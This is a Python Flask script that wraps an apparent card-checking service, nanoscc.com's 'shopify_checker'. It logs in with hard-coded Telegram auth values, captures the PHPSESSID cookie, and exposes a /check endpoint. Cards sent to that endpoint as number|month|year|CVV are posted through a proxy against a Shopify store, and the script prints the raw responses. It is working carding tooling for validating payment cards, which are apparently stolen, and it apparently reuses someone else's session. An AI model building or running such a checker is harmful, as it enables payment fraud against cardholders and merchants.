from flask import Flask, request, jsonify
import requests
import urllib.parse

app = Flask(__name__)

# -----------------------------------------
# LOGIN SESSION (same as your original code)
# -----------------------------------------
session = requests.Session()

params = {
    "id": "7756457768",
    "first_name": "Basic Coders",
    "username": "ccnHater",
    "photo_url": "https://t.me/i/userpic/320/gZCaCmp849XCd6JZPG80ZBovTIvoPpAH3UiBIMDxrEDtK18BJBNqOjjAhCnYzKNU.jpg",
    "auth_date": "1763557531",
    "hash": "cab720e9e94bf3af1d76413d23ff84a5db6f541ef25b45d05f287ffca52b3e67"
}

login_url = "https://nanoscc.com/telegram_login.php?" + urllib.parse.urlencode(params)
session.get(login_url)
phpsessid = session.cookies.get("PHPSESSID")

print("Hey Nano", phpsessid)
print("\nBASIC CODERS — NANO FUCKED\n")

# -----------------------------------------
# SHOPIFY CHECKER SETTINGS
# -----------------------------------------
api_url = "https://nanoscc.com/api/shopify_checker.php"

headers = {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://nanoscc.com",
    "referer": "https://nanoscc.com/checkers/shopify.php",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K)"
}

sites = "https://voyafly.com"
proxy = "TITS.OOPS.WTF:6969:asyncio:requests"

# -----------------------------------------
# API ROUTES
# -----------------------------------------
@app.route("/")
def home():
    return "Shopify Checker API is running!"

# GET method version
@app.route("/check", methods=["GET"])
def check_cards_get():
    """
    Call example:
    https://your-app-name.onrender.com/check?cards=4111111111111111|12|25|123,5555555555554444|11|26|321
    """

    try:
        cards_param = request.args.get("cards")

        if not cards_param:
            return jsonify({"error": "Missing 'cards' query parameter"}), 400

        # Split by comma
        cards = [c.strip() for c in cards_param.split(",") if c.strip()]
        results = []

        print("\n🚀 Checking Started...\n")

        for card in cards:
            print("═══════════════════════════════════")
            print("💳 CARD:", card)
            print("🔍 RAW RESPONSE:")

            data = {
                "card": card,
                "sites": sites,
                "proxy": proxy
            }

            r = session.post(api_url, headers=headers, data=data)

            print(r.text)
            print("═══════════════════════════════════\n")

            results.append({
                "card": card,
                "response": r.text
            })

        return jsonify({"results": results})

    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"error": str(e)}), 500

# -----------------------------------------
# RUN SERVER
# -----------------------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
